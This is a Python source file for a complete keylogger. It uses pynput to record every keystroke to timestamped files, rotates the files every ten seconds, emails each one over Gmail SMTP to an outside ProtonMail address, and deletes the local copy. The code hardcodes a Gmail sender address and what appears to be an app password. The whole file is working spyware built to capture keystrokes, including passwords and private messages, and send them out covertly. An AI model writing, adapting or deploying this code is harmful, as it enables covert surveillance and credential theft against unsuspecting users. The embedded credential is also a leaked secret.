from pynput import keyboard
import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import time
import threading
import os

class keylogger:
    def __init__(self):
        self.filename = self.generate_filename()
        self.file_lock = threading.Lock()
        self.running = True

    def generate_filename(self):
        return datetime.datetime.now().strftime("%d-%m-%Y_%H-%M-%S")+".txt"

    def start_logging(self):

        def on_press(key):
            try:
                log_entry = key.char + " --\n" 
            except AttributeError:
                log_entry = str(key) + " --\n"

            with self.file_lock:
                with open(self.filename, "a") as f:    
                    f.write(log_entry)

        def on_release(key):
            log_entry = str(key) + " --\n"
            with self.file_lock:
                with open(self.filename, "a") as f:    
                    f.write(log_entry)

            # uncomment the below statements if you don't want an infinite loop
            # if key == keyboard.Key.esc:
            #     return False
            
        # print("Keylogger started...")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    def switch_files(self):
        """Rotate the file every desired amount of time and send the other file via mail"""
        
        while self.running:
            time.sleep(10) 
            with self.file_lock:
                old_filename = self.filename
                self.filename = self.generate_filename()
            print(f"Rotating file. New file is {self.filename}")
            self.send_mail(old_filename)


    def send_mail(self, filename):
        """send the file and delete it from the system"""
        print(f"Sending email with file: {filename}")
        HOST = "smtp.gmail.com"
        PORT = 587

        FROM_EMAIL = "thegenetic04@gmail.com"
        TO_EMAIL = "thegenetic00@proton.me"
        PASSWORD = "ergb mimw pfdb wqdo"

        SUBJECT = "Keylogger Logs"
        MESSAGE = """
        Hi,
        Attached are the latest logs captured by the keylogger.

        Regards,
        Keylogger
        """

        # Forming the message body
        message = MIMEMultipart()
        message['Subject'] = SUBJECT
        message['From'] = FROM_EMAIL
        message['To'] = TO_EMAIL
        body_part = MIMEText(MESSAGE)
        message.attach(body_part)

        # Attaching the file
        try:
            with open(filename, 'rb') as file:
                message.attach(MIMEApplication(file.read(), Name=filename))


            smtp = smtplib.SMTP(HOST, PORT)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(FROM_EMAIL, PASSWORD)
            smtp.sendmail(FROM_EMAIL, TO_EMAIL, message.as_string())
            smtp.close()

        except:
            print()

        # delete the file
        time.sleep(5)
        os.remove(filename)



if __name__ == "__main__":
    
    keylogger_instance = keylogger() 
    
    # thread for the key logging
    keylogger_thread = threading.Thread(target=keylogger_instance.start_logging)
    keylogger_thread.start()

    # thread for file switching and mail sending
    switch_thread = threading.Thread(target=keylogger_instance.switch_files)
    switch_thread.start()

    # keep the loop ongoing
    keylogger_thread.join()
    switch_thread.join()

